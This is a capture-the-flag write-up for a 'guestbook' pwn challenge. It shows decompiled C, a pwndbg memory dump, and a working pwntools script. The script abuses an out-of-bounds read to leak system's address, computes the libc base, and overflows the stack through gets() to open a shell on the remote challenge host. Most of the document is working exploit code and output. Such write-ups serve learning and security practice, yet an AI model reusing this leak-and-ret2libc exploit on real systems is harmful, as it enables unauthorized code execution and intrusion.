# Writeup Of AceBear Team

First, use IDA pro to view source code i have:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-98h]
  int v5; // [esp+64h] [ebp-34h]
  int v6; // [esp+68h] [ebp-30h]
  char *dest[4]; // [esp+6Ch] [ebp-2Ch]
  char v8; // [esp+7Fh] [ebp-19h]
  int (**v9)(const char *); // [esp+80h] [ebp-18h]
  char **v10; // [esp+84h] [ebp-14h]
  char *v11; // [esp+88h] [ebp-10h]
  char v12; // [esp+8Fh] [ebp-9h]
  int i; // [esp+90h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0x14u);
  puts("Please setup your guest book:");
  for ( i = 0; i <= 3; ++i )
  {
    printf("Name for guest: #%d\n>>>", i);
    v11 = (char *)malloc(0xFu);
    __isoc99_scanf("%15s", v11);
    v11[14] = 0;
    dest[i] = v11;
  }
  v10 = dest;
  v9 = &system;
  v12 = 1;
  while ( v12 )
  {
    do
      v8 = getchar();
    while ( v8 != 10 && v8 != -1 );
    puts("---------------------------");
    puts("1: View name");
    puts("2: Change name");
    puts("3. Quit");
    printf(">>");
    v6 = 0;
    __isoc99_scanf("%d", &v6);
    switch ( v6 )
    {
      case 2:
        printf("Which entry do you want to change?\n>>>");
        v5 = -1;
        __isoc99_scanf("%d", &v5);
        if ( v5 >= 0 )
        {
          printf("Enter the name of the new guest.\n>>>");
          do
            v8 = getchar();
          while ( v8 != 10 && v8 != -1 );
          gets(&s);
          strcpy(dest[v5], &s);
        }
        else
        {
          puts("Enter a valid number");
        }
        break;
      case 3:
        v12 = 0;
        break;
      case 1:
        readName((int)dest);
        break;
      default:
        puts("Not a valid option. Try again");
        break;
    }
  }
  return 0;
}
```
If i choosen `View name`, i can input entry `> 4` to view some things out of dest's range.
In this case i input `6` to view memory in pointer `0xffffce9c`, i can get the system address.
```
pwndbg> telescope $ebp-0x2c
00:0000│   0xffffce9c —▸ 0x56558008 ◂— 0x31 /* '1' */
01:0004│   0xffffcea0 —▸ 0x56558428 ◂— 0x32 /* '2' */
02:0008│   0xffffcea4 —▸ 0x56558440 ◂— 0x33 /* '3' */
03:000c│   0xffffcea8 —▸ 0x56558458 ◂— 0x34 /* '4' */
04:0010│   0xffffceac ◂— 0xa5559f1
05:0014│   0xffffceb0 —▸ 0xf7e34da0 (system) ◂— sub    esp, 0xc
06:0018│   0xffffceb4 —▸ 0xffffce9c —▸ 0x56558008 ◂— 0x31 /* '1' */
07:001c│   0xffffceb8 —▸ 0x56558458 ◂— 0x34 /* '4' */
```
If i choosen `Change name` I can overflow stack byte `gets(&s);`

```py
from pwn import *

libc = ELF('libc.so.6')
r = remote('guestbook.tuctf.com', 4545)
# libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
# r = process('./guestbook')
# gdb.attach(r, )

def viewname(index):
    r.recvuntil('>>')
    r.sendline('1')
    r.recvuntil('>>>')
    r.sendline(str(index))
    return r.recv(24)

r.recvline()
name = ['a', 'b', '/bin/sh\x00', 'a']
for i in range(4):
    r.recv(1024)
    r.sendline(name[i])

tmp = viewname(6)
heap = u32(tmp[:4])
system = u32(tmp[20:24])
log.info("system: %s" %hex(system))
base = system - libc.symbols['system']
log.info('base: %s' %hex(base))
sh = base + next(libc.search('/bin/sh\x00'))

r.recvuntil('>>')
r.sendline('2')
r.recvuntil('>>>')
r.sendline('0')
r.recvuntil('>>>')
r.sendline('\x00'*(0x98-0x34)+p32(0)*2+p32(heap)*5+p32(0)*7+p32(system)+p32(sh)*2)
r.interactive()
```
